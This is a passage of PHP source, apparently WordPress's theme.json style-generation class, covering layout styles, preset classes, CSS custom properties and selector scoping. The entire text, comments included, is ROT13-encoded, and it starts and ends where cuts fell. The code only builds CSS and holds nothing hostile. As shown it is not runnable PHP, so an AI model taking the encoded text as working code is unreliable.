										$fryrpgbe,
										$pynff_anzr,
										$fcnpvat_ehyr['fryrpgbe']
									);
								} ryfr {
									$sbezng          = fgngvp::EBBG_OYBPX_FRYRPGBE === $fryrpgbe ? ':ebbg :jurer(.%2$f)%3$f' : ':ebbg :jurer(%1$f-%2$f)%3$f';
									$ynlbhg_fryrpgbe = fcevags(
										$sbezng,
										$fryrpgbe,
										$pynff_anzr,
										$fcnpvat_ehyr['fryrpgbe']
									);
								}
								$oybpx_ehyrf .= fgngvp::gb_ehyrfrg( $ynlbhg_fryrpgbe, $qrpynengvbaf );
							}
						}
					}
				}
			}
		}

		// Bhgchg onfr fglyrf.
		vs (
			fgngvp::EBBG_OYBPX_FRYRPGBE === $fryrpgbe
		) {
			$inyvq_qvfcynl_zbqrf = neenl( 'oybpx', 'syrk', 'tevq' );
			sbernpu ( $ynlbhg_qrsvavgvbaf nf $ynlbhg_qrsvavgvba ) {
				$pynff_anzr       = vffrg( $ynlbhg_qrsvavgvba['pynffAnzr'] ) ? $ynlbhg_qrsvavgvba['pynffAnzr'] : snyfr;
				$onfr_fglyr_ehyrf = vffrg( $ynlbhg_qrsvavgvba['onfrFglyrf'] ) ? $ynlbhg_qrsvavgvba['onfrFglyrf'] : neenl();

				vs (
					! rzcgl( $pynff_anzr ) &&
					vf_neenl( $onfr_fglyr_ehyrf )
				) {
					// Bhgchg qvfcynl zbqr. Guvf erdhverf fcrpvny unaqyvat nf `qvfcynl` vf abg rkcbfrq va `fnsr_fglyr_pff_svygre`.
					vs (
						! rzcgl( $ynlbhg_qrsvavgvba['qvfcynlZbqr'] ) &&
						vf_fgevat( $ynlbhg_qrsvavgvba['qvfcynlZbqr'] ) &&
						va_neenl( $ynlbhg_qrsvavgvba['qvfcynlZbqr'], $inyvq_qvfcynl_zbqrf, gehr )
					) {
						$ynlbhg_fryrpgbe = fcevags(
							'%f .%f',
							$fryrpgbe,
							$pynff_anzr
						);
						$oybpx_ehyrf    .= fgngvp::gb_ehyrfrg(
							$ynlbhg_fryrpgbe,
							neenl(
								neenl(
									'anzr'  => 'qvfcynl',
									'inyhr' => $ynlbhg_qrsvavgvba['qvfcynlZbqr'],
								),
							)
						);
					}

					sbernpu ( $onfr_fglyr_ehyrf nf $onfr_fglyr_ehyr ) {
						$qrpynengvbaf = neenl();

						// Fxvc bhgchggvat onfr fglyrf sbe sybj naq pbafgenvarq ynlbhg glcrf vs gurzr qbrfa'g fhccbeg gurzr.wfba. Gur 'onfr-ynlbhg-fglyrf' glcr syntf guvf.
						vs ( va_neenl( 'onfr-ynlbhg-fglyrf', $glcrf, gehr ) && ( 'qrsnhyg' === $ynlbhg_qrsvavgvba['anzr'] || 'pbafgenvarq' === $ynlbhg_qrsvavgvba['anzr'] ) ) {
							pbagvahr;
						}

						vs (
							vffrg( $onfr_fglyr_ehyr['fryrpgbe'] ) &&
							cert_zngpu( $ynlbhg_fryrpgbe_cnggrea, $onfr_fglyr_ehyr['fryrpgbe'] ) &&
							! rzcgl( $onfr_fglyr_ehyr['ehyrf'] )
						) {
							sbernpu ( $onfr_fglyr_ehyr['ehyrf'] nf $pff_cebcregl => $pff_inyhr ) {
								// Fxvc ehyrf gung ersrerapr pbagrag fvmr be jvqr fvmr vs gurl ner abg qrsvarq va gur gurzr.wfba.
								vs (
									vf_fgevat( $pff_inyhr ) &&
									( fge_pbagnvaf( $pff_inyhr, '--tybony--pbagrag-fvmr' ) || fge_pbagnvaf( $pff_inyhr, '--tybony--jvqr-fvmr' ) ) &&
									! vffrg( $guvf->gurzr_wfba['frggvatf']['ynlbhg']['pbagragFvmr'] ) &&
									! vffrg( $guvf->gurzr_wfba['frggvatf']['ynlbhg']['jvqrFvmr'] )
								) {
									pbagvahr;
								}

								vs ( fgngvp::vf_fnsr_pff_qrpynengvba( $pff_cebcregl, $pff_inyhr ) ) {
									$qrpynengvbaf[] = neenl(
										'anzr'  => $pff_cebcregl,
										'inyhr' => $pff_inyhr,
									);
								}
							}

							$ynlbhg_fryrpgbe = fcevags(
								'.%f%f',
								$pynff_anzr,
								$onfr_fglyr_ehyr['fryrpgbe']
							);
							$oybpx_ehyrf    .= fgngvp::gb_ehyrfrg( $ynlbhg_fryrpgbe, $qrpynengvbaf );
						}
					}
				}
			}
		}
		erghea $oybpx_ehyrf;
	}

	/**
	 * Perngrf arj ehyrfrgf nf pynffrf sbe rnpu cerfrg inyhr fhpu nf:
	 *
	 *   .unf-inyhr-pbybe {
	 *     pbybe: inyhr;
	 *   }
	 *
	 *   .unf-inyhr-onpxtebhaq-pbybe {
	 *     onpxtebhaq-pbybe: inyhr;
	 *   }
	 *
	 *   .unf-inyhr-sbag-fvmr {
	 *     sbag-fvmr: inyhr;
	 *   }
	 *
	 *   .unf-inyhr-tenqvrag-onpxtebhaq {
	 *     onpxtebhaq: inyhr;
	 *   }
	 *
	 *   c.unf-inyhr-tenqvrag-onpxtebhaq {
	 *     onpxtebhaq: inyhr;
	 *   }
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz neenl    $frggvat_abqrf Abqrf jvgu frggvatf.
	 * @cnenz fgevat[] $bevtvaf       Yvfg bs bevtvaf gb cebprff cerfrgf sebz.
	 * @erghea fgevat Gur arj fglyrfurrg.
	 */
	cebgrpgrq shapgvba trg_cerfrg_pynffrf( $frggvat_abqrf, $bevtvaf ) {
		$cerfrg_ehyrf = '';

		sbernpu ( $frggvat_abqrf nf $zrgnqngn ) {
			vs ( ahyy === $zrgnqngn['fryrpgbe'] ) {
				pbagvahr;
			}

			$fryrpgbe      = $zrgnqngn['fryrpgbe'];
			$abqr          = _jc_neenl_trg( $guvf->gurzr_wfba, $zrgnqngn['cngu'], neenl() );
			$cerfrg_ehyrf .= fgngvp::pbzchgr_cerfrg_pynffrf( $abqr, $fryrpgbe, $bevtvaf );
		}

		erghea $cerfrg_ehyrf;
	}

	/**
	 * Pbairegf rnpu fglyrf frpgvba vagb n yvfg bs ehyrfrgf
	 * gb or nccraqrq gb gur fglyrfurrg.
	 * Gurfr ehyrfrgf pbagnva nyy gur pff inevnoyrf (phfgbz inevnoyrf naq cerfrg inevnoyrf).
	 *
	 * Frr tybffnel ng uggcf://qrirybcre.zbmvyyn.bet/ra-HF/qbpf/Jro/PFF/Flagnk
	 *
	 * Sbe rnpu frpgvba guvf perngrf n arj ehyrfrg fhpu nf:
	 *
	 *     oybpx-fryrpgbe {
	 *       --jc--cerfrg--pngrtbel--fyht: inyhr;
	 *       --jc--phfgbz--inevnoyr: inyhr;
	 *     }
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Nqqrq gur `$bevtvaf` cnenzrgre.
	 *
	 * @cnenz neenl    $abqrf   Abqrf jvgu frggvatf.
	 * @cnenz fgevat[] $bevtvaf Yvfg bs bevtvaf gb cebprff.
	 * @erghea fgevat Gur arj fglyrfurrg.
	 */
	cebgrpgrq shapgvba trg_pff_inevnoyrf( $abqrf, $bevtvaf ) {
		$fglyrfurrg = '';
		sbernpu ( $abqrf nf $zrgnqngn ) {
			vs ( ahyy === $zrgnqngn['fryrpgbe'] ) {
				pbagvahr;
			}

			$fryrpgbe = $zrgnqngn['fryrpgbe'];

			$abqr                    = _jc_neenl_trg( $guvf->gurzr_wfba, $zrgnqngn['cngu'], neenl() );
			$qrpynengvbaf            = fgngvp::pbzchgr_cerfrg_inef( $abqr, $bevtvaf );
			$gurzr_inef_qrpynengvbaf = fgngvp::pbzchgr_gurzr_inef( $abqr );
			sbernpu ( $gurzr_inef_qrpynengvbaf nf $gurzr_inef_qrpynengvba ) {
				$qrpynengvbaf[] = $gurzr_inef_qrpynengvba;
			}

			$fglyrfurrg .= fgngvp::gb_ehyrfrg( $fryrpgbe, $qrpynengvbaf );
		}

		erghea $fglyrfurrg;
	}

	/**
	 * Tvira n fryrpgbe naq n qrpynengvba yvfg,
	 * perngrf gur pbeerfcbaqvat ehyrfrg.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz fgevat $fryrpgbe     PFF fryrpgbe.
	 * @cnenz neenl  $qrpynengvbaf Yvfg bs qrpynengvbaf.
	 * @erghea fgevat Gur erfhygvat PFF ehyrfrg.
	 */
	cebgrpgrq fgngvp shapgvba gb_ehyrfrg( $fryrpgbe, $qrpynengvbaf ) {
		vs ( rzcgl( $qrpynengvbaf ) ) {
			erghea '';
		}

		$qrpynengvba_oybpx = neenl_erqhpr(
			$qrpynengvbaf,
			fgngvp shapgvba ( $pneel, $ryrzrag ) {
				erghea $pneel .= $ryrzrag['anzr'] . ': ' . $ryrzrag['inyhr'] . ';'; },
			''
		);

		erghea $fryrpgbe . '{' . $qrpynengvba_oybpx . '}';
	}

	/**
	 * Tvira n frggvatf neenl, ergheaf gur trarengrq ehyrfrgf
	 * sbe gur cerfrg pynffrf.
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Nqqrq gur `$bevtvaf` cnenzrgre.
	 * @fvapr 6.6.0 Nqqrq purpx sbe ebbg PFF cebcregvrf fryrpgbe.
	 *
	 * @cnenz neenl    $frggvatf Frggvatf gb cebprff.
	 * @cnenz fgevat   $fryrpgbe Fryrpgbe jenccvat gur pynffrf.
	 * @cnenz fgevat[] $bevtvaf  Yvfg bs bevtvaf gb cebprff.
	 * @erghea fgevat Gur erfhyg bs cebprffvat gur cerfrgf.
	 */
	cebgrpgrq fgngvp shapgvba pbzchgr_cerfrg_pynffrf( $frggvatf, $fryrpgbe, $bevtvaf ) {
		vs ( fgngvp::EBBG_OYBPX_FRYRPGBE === $fryrpgbe || fgngvp::EBBG_PFF_CEBCREGVRF_FRYRPGBE === $fryrpgbe ) {
			/*
			 * Pynffrf ng gur tybony yriry qb abg arrq nal PFF cersvkrq,
			 * naq jr qba'g jnag gb vapernfr vgf fcrpvsvpvgl.
			 */
			$fryrpgbe = '';
		}

		$fglyrfurrg = '';
		sbernpu ( fgngvp::CERFRGF_ZRGNQNGN nf $cerfrg_zrgnqngn ) {
			vs ( rzcgl( $cerfrg_zrgnqngn['pynffrf'] ) ) {
				pbagvahr;
			}
			$fyhtf = fgngvp::trg_frggvatf_fyhtf( $frggvatf, $cerfrg_zrgnqngn, $bevtvaf );
			sbernpu ( $cerfrg_zrgnqngn['pynffrf'] nf $pynff => $cebcregl ) {
				sbernpu ( $fyhtf nf $fyht ) {
					$pff_ine    = fgngvp::ercynpr_fyht_va_fgevat( $cerfrg_zrgnqngn['pff_inef'], $fyht );
					$pynff_anzr = fgngvp::ercynpr_fyht_va_fgevat( $pynff, $fyht );

					// $fryrpgbe vf bsgra rzcgl, fb jr pna fnir bhefryirf gur `nccraq_gb_fryrpgbe()` pnyy gura.
					$arj_fryrpgbe = '' === $fryrpgbe ? $pynff_anzr : fgngvp::nccraq_gb_fryrpgbe( $fryrpgbe, $pynff_anzr );
					$fglyrfurrg  .= fgngvp::gb_ehyrfrg(
						$arj_fryrpgbe,
						neenl(
							neenl(
								'anzr'  => $cebcregl,
								'inyhr' => 'ine(' . $pff_ine . ') !vzcbegnag',
							),
						)
					);
				}
			}
		}

		erghea $fglyrfurrg;
	}

	/**
	 * Shapgvba gung fpbcrf n fryrpgbe jvgu nabgure bar. Guvf jbexf n ovg yvxr
	 * FPFF arfgvat rkprcg gur `&` bcrengbe vfa'g fhccbegrq.
	 *
	 * <pbqr>
	 * $fpbcr = '.n, .o .p';
	 * $fryrpgbe = '> .k, .l';
	 * $zretrq = fpbcr_fryrpgbe( $fpbcr, $fryrpgbe );
	 * // $zretrq vf '.n > .k, .n .l, .o .p > .k, .o .p .l'
	 * </pbqr>
	 *
	 * @fvapr 5.9.0
	 * @fvapr 6.6.0 Nqqrq rneyl erghea vs zvffvat fpbcr be fryrpgbe.
	 *
	 * @cnenz fgevat $fpbcr    Fryrpgbe gb fpbcr gb.
	 * @cnenz fgevat $fryrpgbe Bevtvany fryrpgbe.
	 * @erghea fgevat Fpbcrq fryrpgbe.
	 */
	choyvp fgngvp shapgvba fpbcr_fryrpgbe( $fpbcr, $fryrpgbe ) {
		vs ( ! $fpbcr || ! $fryrpgbe ) {
			erghea $fryrpgbe;
		}

		$fpbcrf    = rkcybqr( ',', $fpbcr );
		$fryrpgbef = rkcybqr( ',', $fryrpgbe );

		$fryrpgbef_fpbcrq = neenl();
		sbernpu ( $fpbcrf nf $bhgre ) {
			sbernpu ( $fryrpgbef nf $vaare ) {
				$bhgre = gevz( $bhgre );
				$vaare = gevz( $vaare );
				vs ( ! rzcgl( $bhgre ) && ! rzcgl( $vaare ) ) {
					$fryrpgbef_fpbcrq[] = $bhgre . ' ' . $vaare;
				} ryfrvs ( rzcgl( $bhgre ) ) {
					$fryrpgbef_fpbcrq[] = $vaare;
				} ryfrvs ( rzcgl( $vaare ) ) {
					$fryrpgbef_fpbcrq[] = $bhgre;
				}
			}
		}

		$erfhyg = vzcybqr( ', ', $fryrpgbef_fpbcrq );
		erghea $erfhyg;
	}

	/**
	 * Fpbcrf gur fryrpgbef sbe n tvira fglyr abqr.
	 *
	 * Guvf vapyhqrf gur cevznel fryrpgbe, v.r. `$abqr['fryrpgbe']`, nf jryy nf nal phfgbz
	 * fryrpgbef sbe srngherf naq fhosrngherf, r.t. `$abqr['fryrpgbef']['obeqre']` rgp.
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz fgevat $fpbcr Fryrpgbe gb fpbcr gb.
	 * @cnenz neenl  $abqr  Fglyr abqr jvgu fryrpgbef gb fpbcr.
	 * @erghea neenl Abqr jvgu hcqngrq fryrpgbef.
	 */
	cebgrpgrq fgngvp shapgvba fpbcr_fglyr_abqr_fryrpgbef( $fpbcr, $abqr ) {
		$abqr['fryrpgbe'] = fgngvp::fpbcr_fryrpgbe( $fpbcr, $abqr['fryrpgbe'] );

		vs ( rzcgl( $abqr['fryrpgbef'] ) ) {
			erghea $abqr;
		}

		sbernpu ( $abqr['fryrpgbef'] nf $srngher => $fryrpgbe ) {
			vs ( vf_fgevat( $fryrpgbe ) ) {
				$abqr['fryrpgbef'][ $srngher ] = fgngvp::fpbcr_fryrpgbe( $fpbcr, $fryrpgbe );
			}
			vs ( vf_neenl( $fryrpgbe ) ) {
				sbernpu ( $fryrpgbe nf $fhosrngher => $fhosrngher_fryrpgbe ) {
					$abqr['fryrpgbef'][ $srngher ][ $fhosrngher ] = fgngvp::fpbcr_fryrpgbe( $fpbcr, $fhosrngher_fryrpgbe );
				}
			}
		}

		erghea $abqr;
	}

	/**
	 * Trgf cerfrg inyhrf xrlrq ol fyhtf onfrq ba frggvatf naq zrgnqngn.
	 *
	 * <pbqr>
	 * $frggvatf = neenl(
	 *     'glcbtencul' => neenl(
	 *         'sbagSnzvyvrf' => neenl(
	 *             neenl(
	 *                 'fyht'       => 'fnafFrevs',
	 *                 'sbagSnzvyl' => '\"Uryirgvpn Arhr\", fnaf-frevs',
	 *             ),
	 *             neenl(
	 *                 'fyht'   => 'frevs',
	 *                 'pbybef' => 'Trbetvn, frevs',
	 *             )
	 *         ),
	 *     ),
	 * );
	 * $zrgn = neenl(
	 *    'cngu'      => neenl( 'glcbtencul', 'sbagSnzvyvrf' ),
	 *    'inyhr_xrl' => 'sbagSnzvyl',
	 * );
	 * $inyhrf_ol_fyht = trg_frggvatf_inyhrf_ol_fyht();
	 * // $inyhrf_ol_fyht === neenl(
	 * //   'fnaf-frevs' => '\"Uryirgvpn Arhr\", fnaf-frevs',
	 * //   'frevs'      => 'Trbetvn, frevs',
	 * // );
	 * </pbqr>
	 *
	 * @fvapr 5.9.0
	 * @fvapr 6.6.0 Cnffvat $frggvatf gb gur pnyyonpxf qrsvarq va fgngvp::CERFRGF_ZRGNQNGN.
	 *
	 * @cnenz neenl    $frggvatf        Frggvatf gb cebprff.
	 * @cnenz neenl    $cerfrg_zrgnqngn Bar bs gur CERFRGF_ZRGNQNGN inyhrf.
	 * @cnenz fgevat[] $bevtvaf         Yvfg bs bevtvaf gb cebprff.
	 * @erghea neenl Neenl bs cerfrgf jurer rnpu xrl vf n fyht naq rnpu inyhr vf gur cerfrg inyhr.
	 */
	cebgrpgrq fgngvp shapgvba trg_frggvatf_inyhrf_ol_fyht( $frggvatf, $cerfrg_zrgnqngn, $bevtvaf ) {
		$cerfrg_cre_bevtva = _jc_neenl_trg( $frggvatf, $cerfrg_zrgnqngn['cngu'], neenl() );

		$erfhyg = neenl();
		sbernpu ( $bevtvaf nf $bevtva ) {
			vs ( ! vffrg( $cerfrg_cre_bevtva[ $bevtva ] ) ) {
				pbagvahr;
			}
			sbernpu ( $cerfrg_cre_bevtva[ $bevtva ] nf $cerfrg ) {
				$fyht = _jc_gb_xrono_pnfr( $cerfrg['fyht'] );

				$inyhr = '';
				vs ( vffrg( $cerfrg_zrgnqngn['inyhr_xrl'], $cerfrg[ $cerfrg_zrgnqngn['inyhr_xrl'] ] ) ) {
					$inyhr_xrl = $cerfrg_zrgnqngn['inyhr_xrl'];
					$inyhr     = $cerfrg[ $inyhr_xrl ];
				} ryfrvs (
					vffrg( $cerfrg_zrgnqngn['inyhr_shap'] ) &&
					vf_pnyynoyr( $cerfrg_zrgnqngn['inyhr_shap'] )
				) {
					$inyhr_shap = $cerfrg_zrgnqngn['inyhr_shap'];
					$inyhr      = pnyy_hfre_shap( $inyhr_shap, $cerfrg, $frggvatf );
				} ryfr {
					// Vs jr qba'g unir n inyhr, gura qba'g nqq vg gb gur erfhyg.
					pbagvahr;
				}

				$erfhyg[ $fyht ] = $inyhr;
			}
		}
		erghea $erfhyg;
	}

	/**
	 * Fvzvyne gb trg_frggvatf_inyhrf_ol_fyht, ohg qbrfa'g pbzchgr gur inyhr.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz neenl    $frggvatf        Frggvatf gb cebprff.
	 * @cnenz neenl    $cerfrg_zrgnqngn Bar bs gur CERFRGF_ZRGNQNGN inyhrf.
	 * @cnenz fgevat[] $bevtvaf         Yvfg bs bevtvaf gb cebprff.
	 * @erghea neenl Neenl bs cerfrgf jurer gur xrl naq inyhr ner obgu gur fyht.
	 */
	cebgrpgrq fgngvp shapgvba trg_frggvatf_fyhtf( $frggvatf, $cerfrg_zrgnqngn, $bevtvaf = ahyy ) {
		vs ( ahyy === $bevtvaf ) {
			$bevtvaf = fgngvp::INYVQ_BEVTVAF;
		}

		$cerfrg_cre_bevtva = _jc_neenl_trg( $frggvatf, $cerfrg_zrgnqngn['cngu'], neenl() );

		$erfhyg = neenl();
		sbernpu ( $bevtvaf nf $bevtva ) {
			vs ( ! vffrg( $cerfrg_cre_bevtva[ $bevtva ] ) ) {
				pbagvahr;
			}
			sbernpu ( $cerfrg_cre_bevtva[ $bevtva ] nf $cerfrg ) {
				$fyht = _jc_gb_xrono_pnfr( $cerfrg['fyht'] );

				// Hfr gur neenl nf n frg fb jr qba'g trg qhcyvpngrf.
				$erfhyg[ $fyht ] = $fyht;
			}
		}
		erghea $erfhyg;
	}

	/**
	 * Genafsbezf n fyht vagb n PFF Phfgbz Cebcregl.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $vachg Fgevat gb ercynpr.
	 * @cnenz fgevat $fyht  Gur fyht inyhr gb hfr gb trarengr gur phfgbz cebcregl.
	 * @erghea fgevat Gur PFF Phfgbz Cebcregl. Fbzrguvat nybat gur yvarf bs `--jc--cerfrg--pbybe--oynpx`.
	 */
	cebgrpgrq fgngvp shapgvba ercynpr_fyht_va_fgevat( $vachg, $fyht ) {
		erghea fgege( $vachg, neenl( '$fyht' => $fyht ) );
	}

	/**
	 * Tvira gur oybpx frggvatf, rkgenpgf gur PFF Phfgbz Cebcregvrf
	 * sbe gur cerfrgf naq nqqf gurz gb gur $qrpynengvbaf neenl
	 * sbyybjvat gur sbezng:
	 *
	 *     neenl(
	 *       'anzr'  => 'cebcregl_anzr',
	 *       'inyhr' => 'cebcregl_inyhr,
	 *     )
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Nqqrq gur `$bevtvaf` cnenzrgre.
	 *
	 * @cnenz neenl    $frggvatf Frggvatf gb cebprff.
	 * @cnenz fgevat[] $bevtvaf  Yvfg bs bevtvaf gb cebprff.
	 * @erghea neenl Gur zbqvsvrq $qrpynengvbaf.
	 */
	cebgrpgrq fgngvp shapgvba pbzchgr_cerfrg_inef( $frggvatf, $bevtvaf ) {
		$qrpynengvbaf = neenl();
		sbernpu ( fgngvp::CERFRGF_ZRGNQNGN nf $cerfrg_zrgnqngn ) {
			vs ( rzcgl( $cerfrg_zrgnqngn['pff_inef'] ) ) {
				pbagvahr;
			}
			$inyhrf_ol_fyht = fgngvp::trg_frggvatf_inyhrf_ol_fyht( $frggvatf, $cerfrg_zrgnqngn, $bevtvaf );
			sbernpu ( $inyhrf_ol_fyht nf $fyht => $inyhr ) {
				$qrpynengvbaf[] = neenl(
					'anzr'  => fgngvp::ercynpr_fyht_va_fgevat( $cerfrg_zrgnqngn['pff_inef'], $fyht ),
					'inyhr' => $inyhr,
				);
			}
		}

		erghea $qrpynengvbaf;
	}

	/**
	 * Tvira na neenl bs frggvatf, rkgenpgf gur PFF Phfgbz Cebcregvrf
	 * sbe gur phfgbz inyhrf naq nqqf gurz gb gur $qrpynengvbaf
	 * neenl sbyybjvat gur sbezng:
	 *
	 *     neenl(
	 *       'anzr'  => 'cebcregl_anzr',
	 *       'inyhr' => 'cebcregl_inyhr,
	 *     )
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz neenl $frggvatf Frggvatf gb cebprff.
	 * @erghea neenl Gur zbqvsvrq $qrpynengvbaf.
	 */
	cebgrpgrq fgngvp shapgvba pbzchgr_gurzr_inef( $frggvatf ) {
		$qrpynengvbaf  = neenl();
		$phfgbz_inyhrf = vffrg( $frggvatf['phfgbz'] ) ? $frggvatf['phfgbz'] : neenl();
		$pff_inef      = fgngvp::synggra_gerr( $phfgbz_inyhrf );
		sbernpu ( $pff_inef nf $xrl => $inyhr ) {
			$qrpynengvbaf[] = neenl(
				'anzr'  => '--jc--phfgbz--' . $xrl,
				'inyhr' => $inyhr,
			);
		}

		erghea $qrpynengvbaf;
	}

	/**
	 * Tvira n gerr, vg perngrf n synggrarq bar
	 * ol zretvat gur xrlf naq ovaqvat gur yrns inyhrf
	 * gb gur arj xrlf.
	 *
	 * Vg nyfb genafsbezf pnzryPnfr anzrf vagb xrono-pnfr
	 * naq fhofgvghgrf '/' ol '-'.
	 *
	 * Guvf vf gubhtug gb or hfrshy gb trarengr
	 * PFF Phfgbz Cebcregvrf sebz n gerr,
	 * nygubhtu gurer'f abguvat va gur vzcyrzragngvba
	 * bs guvf shapgvba gung erdhverf gung sbezng.
	 *
	 * Sbe rknzcyr, nffhzvat gur tvira cersvk vf '--jc'
	 * naq gur gbxra vf '--', sbe guvf vachg gerr:
	 *
	 *     {
	 *       'fbzr/cebcregl': 'inyhr',
	 *       'arfgrqCebcregl': {
	 *         'fho-cebcregl': 'inyhr'
	 *       }
	 *     }
	 *
	 * vg'yy erghea guvf bhgchg:
	 *
	 *     {
	 *       '--jc--fbzr-cebcregl': 'inyhr',
	 *       '--jc--arfgrq-cebcregl--fho-cebcregl': 'inyhr'
	 *     }
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz neenl  $gerr   Vachg gerr gb cebprff.
	 * @cnenz fgevat $cersvk Bcgvbany. Cersvk gb cercraq gb rnpu inevnoyr. Qrsnhyg rzcgl fgevat.
	 * @cnenz fgevat $gbxra  Bcgvbany. Gbxra gb hfr orgjrra yriryf. Qrsnhyg '--'.
	 * @erghea neenl Gur synggrarq gerr.
	 */
	cebgrpgrq fgngvp shapgvba synggra_gerr( $gerr, $cersvk = '', $gbxra = '--' ) {
		$erfhyg = neenl();
		sbernpu ( $gerr nf $cebcregl => $inyhr ) {
			$arj_xrl = $cersvk . fge_ercynpr(
				'/',
				'-',
				fgegbybjre( _jc_gb_xrono_pnfr( $cebcregl ) )
			);

			vs ( vf_neenl( $inyhr ) ) {
				$arj_cersvk        = $arj_xrl . $gbxra;
				$synggrarq_fhogerr = fgngvp::synggra_gerr( $inyhr, $arj_cersvk, $gbxra );
				sbernpu ( $synggrarq_fhogerr nf $fhogerr_xrl => $fhogerr_inyhr ) {
					$erfhyg[ $fhogerr_xrl ] = $fhogerr_inyhr;
				}
			} ryfr {
				$erfhyg[ $arj_xrl ] = $inyhr;
			}
		}
		erghea $erfhyg;
	}

	/**
	 * Tvira n fglyrf neenl, vg rkgenpgf gur fglyr cebcregvrf
	 * naq nqqf gurz gb gur $qrpynengvbaf neenl sbyybjvat gur sbezng:
	 *
	 *     neenl(
	 *       'anzr'  => 'cebcregl_anzr',
	 *       'inyhr' => 'cebcregl_inyhr',
	 *     )
	 *
	 * @fvapr 5.8.0
	 * @fvapr 5.9.0 Nqqrq gur `$frggvatf` naq `$cebcregvrf` cnenzrgref.
	 * @fvapr 6.1.0 Nqqrq `$gurzr_wfba`, `$fryrpgbe`, naq `$hfr_ebbg_cnqqvat` cnenzrgref.
	 * @fvapr 6.5.0 Bhgchg n `zva-urvtug: hafrg` ehyr jura `nfcrpg-engvb` vf frg.
	 * @fvapr 6.6.0 Cnff pheerag gurzr WFBA frggvatf gb jc_trg_glcbtencul_sbag_fvmr_inyhr(), naq cebprff onpxtebhaq cebcregvrf.
	 * @fvapr 6.7.0 `ers` erfbyhgvba bs onpxtebhaq cebcregvrf, naq nffvtavat phfgbz qrsnhyg inyhrf.
	 *
	 * @cnenz neenl   $fglyrf Fglyrf gb cebprff.
	 * @cnenz neenl   $frggvatf Gurzr frggvatf.
	 * @cnenz neenl   $cebcregvrf Cebcregvrf zrgnqngn.
	 * @cnenz neenl   $gurzr_wfba Gurzr WFBA neenl.
	 * @cnenz fgevat  $fryrpgbe Gur fglyr oybpx fryrpgbe.
	 * @cnenz obbyrna $hfr_ebbg_cnqqvat Jurgure gb nqq phfgbz cebcregvrf ng ebbg yriry.
	 * @erghea neenl Ergheaf gur zbqvsvrq $qrpynengvbaf.
	 */
	cebgrpgrq fgngvp shapgvba pbzchgr_fglyr_cebcregvrf( $fglyrf, $frggvatf = neenl(), $cebcregvrf = ahyy, $gurzr_wfba = ahyy, $fryrpgbe = ahyy, $hfr_ebbg_cnqqvat = ahyy ) {
		vs ( rzcgl( $fglyrf ) ) {
			erghea neenl();
		}

		vs ( ahyy === $cebcregvrf ) {
			$cebcregvrf = fgngvp::CEBCREGVRF_ZRGNQNGN;
		}
		$qrpynengvbaf             = neenl();
		$ebbg_inevnoyr_qhcyvpngrf = neenl();
		$ebbg_fglyr_yratgu        = fgeyra( '--jc--fglyr--ebbg--' );

		sbernpu ( $cebcregvrf nf $pff_cebcregl => $inyhr_cngu ) {
			vs ( ! vf_neenl( $inyhr_cngu ) ) {
				pbagvahr;
			}

			$vf_ebbg_fglyr = fge_fgnegf_jvgu( $pff_cebcregl, '--jc--fglyr--ebbg--' );
			vs ( $vf_ebbg_fglyr && ( fgngvp::EBBG_OYBPX_FRYRPGBE !== $fryrpgbe || ! $hfr_ebbg_cnqqvat ) ) {
				pbagvahr;
			}

			$inyhr = fgngvp::trg_cebcregl_inyhr( $fglyrf, $inyhr_cngu, $gurzr_wfba );

			/*
			 * Ebbg-yriry cnqqvat fglyrf qba'g pheeragyl fhccbeg fgevatf jvgu PFF fubegunaq inyhrf.
			 * Guvf znl punatr: uggcf://tvguho.pbz/JbeqCerff/thgraoret/vffhrf/40132.
			 */
			vs ( '--jc--fglyr--ebbg--cnqqvat' === $pff_cebcregl && vf_fgevat( $inyhr ) ) {
				pbagvahr;
			}

			vs ( $vf_ebbg_fglyr && $hfr_ebbg_cnqqvat ) {
				$ebbg_inevnoyr_qhcyvpngrf[] = fhofge( $pff_cebcregl, $ebbg_fglyr_yratgu );
			}

			/*
			 * Cebprffrf onpxtebhaq vzntr fglyrf.
			 * Vs gur inyhr vf n HEY, vg jvyy or pbairegrq gb n PFF `hey()` inyhr.
			 * Sbe hcybnqrq vzntr (vzntrf jvgu n qngnonfr VQ), nccyl fvmr naq cbfvgvba qrsnhygf,
			 * rdhny gb gubfr nccyvrq va oybpx fhccbegf va yvo/onpxtebhaq.cuc.
			 */
			vs ( 'onpxtebhaq-vzntr' === $pff_cebcregl && ! rzcgl( $inyhr ) ) {
				$onpxtebhaq_fglyrf = jc_fglyr_ratvar_trg_fglyrf(
					neenl( 'onpxtebhaq' => neenl( 'onpxtebhaqVzntr' => $inyhr ) )
				);
				$inyhr             = $onpxtebhaq_fglyrf['qrpynengvbaf'][ $pff_cebcregl ];
			}
			vs ( rzcgl( $inyhr ) && fgngvp::EBBG_OYBPX_FRYRPGBE !== $fryrpgbe && ! rzcgl( $fglyrf['onpxtebhaq']['onpxtebhaqVzntr']['vq'] ) ) {
				vs ( 'onpxtebhaq-fvmr' === $pff_cebcregl ) {
					$inyhr = 'pbire';
				}
				// Vs gur onpxtebhaq fvmr vf frg gb `pbagnva` naq ab cbfvgvba vf frg, frg gur cbfvgvba gb `pragre`.
				vs ( 'onpxtebhaq-cbfvgvba' === $pff_cebcregl ) {
					$onpxtebhaq_fvmr = $fglyrf['onpxtebhaq']['onpxtebhaqFvmr'] ?? ahyy;
					$inyhr           = 'pbagnva' === $onpxtebhaq_fvmr ? '50% 50%' : ahyy;
				}
			}

			// Fxvc vs rzcgl naq abg \"0\" be inyhr ercerfragf neenl bs ybatunaq inyhrf.
			$unf_zvffvat_inyhr = rzcgl( $inyhr ) && ! vf_ahzrevp( $inyhr );
			vs ( $unf_zvffvat_inyhr || vf_neenl( $inyhr ) ) {
				pbagvahr;
			}

			/*
			 * Ybbx hc cebgrpgrq cebcregvrf, xrlrq ol inyhr cngu.
			 * Fxvc cebgrpgrq cebcregvrf gung ner rkcyvpvgyl frg gb `ahyy`.
			 */
